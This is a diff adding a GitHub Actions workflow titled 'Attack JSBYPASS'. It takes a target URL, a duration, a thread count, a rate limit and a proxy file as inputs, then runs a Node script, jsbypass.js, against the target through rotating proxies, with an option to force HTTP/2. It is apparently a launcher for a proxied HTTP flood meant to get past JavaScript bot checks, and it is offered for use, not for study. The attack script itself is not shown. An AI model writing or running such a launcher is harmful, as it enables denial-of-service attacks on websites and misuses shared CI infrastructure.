@@ -1,0 +1,96 @@
+name: Attack JSBYPASS
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_url:
+        description: 'Target URL (https://...)'
+        required: true
+      request_method:
+        description: 'Request method: GET or POST'
+        required: true
+        default: 'GET'
+        type: choice
+        options:
+          - 'GET'
+          - 'POST'
+      duration:
+        description: 'Duration in seconds'
+        required: true
+        default: '60'
+      threads:
+        description: 'Number of proxy workers'
+        required: true
+        default: '4'
+      ratelimit:
+        description: 'Rate limit value'
+        required: true
+        default: '100'
+      proxy_file:
+        description: 'Proxy filename in repo'
+        required: true
+        default: 'http.txt'
+      use_proxy:
+        description: 'Enable proxy mode'
+        required: false
+        default: 'true'
+        type: choice
+        options:
+          - 'true'
+          - 'false'
+      force_http:
+        description: 'Force HTTP mode: 1=h1 only, 2=h2 only, empty auto'
+        required: false
+        default: '2'
+      auth:
+        description: 'Proxy auth flag'
+        required: false
+        default: 'true'
+        type: choice
+        options:
+          - 'true'
+          - 'false'
+      debug:
+        description: 'Enable debug output'
+        required: false
+        default: 'false'
+        type: choice
+        options:
+          - 'true'
+          - 'false'
+
+jobs:
+  build-and-run:
+    runs-on: ubuntu-22.04
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+          cache: 'npm'
+
+      - name: Install JS dependencies
+        run: |
+          npm install hpack chalk
+
+      - name: Run JSBYPASS attack
+        run: |
+          TARGET_URL="${{ github.event.inputs.target_url }}"
+          REQUEST_METHOD="${{ github.event.inputs.request_method }}"
+          DURATION="${{ github.event.inputs.duration }}"
+          THREADS="${{ github.event.inputs.threads }}"
+          RATELIMIT="${{ github.event.inputs.ratelimit }}"
+          PROXY_FILE="${{ github.event.inputs.proxy_file }}"
+          FORCE_HTTP="${{ github.event.inputs.force_http }}"
+          DEBUG_FLAG=""
+          if [ "${{ github.event.inputs.debug }}" = 'true' ]; then
+            DEBUG_FLAG='--debug'
+          fi
+          AUTH_FLAG=""
+          if [ "${{ github.event.inputs.auth }}" = 'true' ]; then
+            AUTH_FLAG='--auth'
+          fi
+          node jsbypass.js "$REQUEST_METHOD" "$TARGET_URL" "$DURATION" "$THREADS" "$RATELIMIT" "$PROXY_FILE" --http "$FORCE_HTTP" $AUTH_FLAG $DEBUG_FLAG
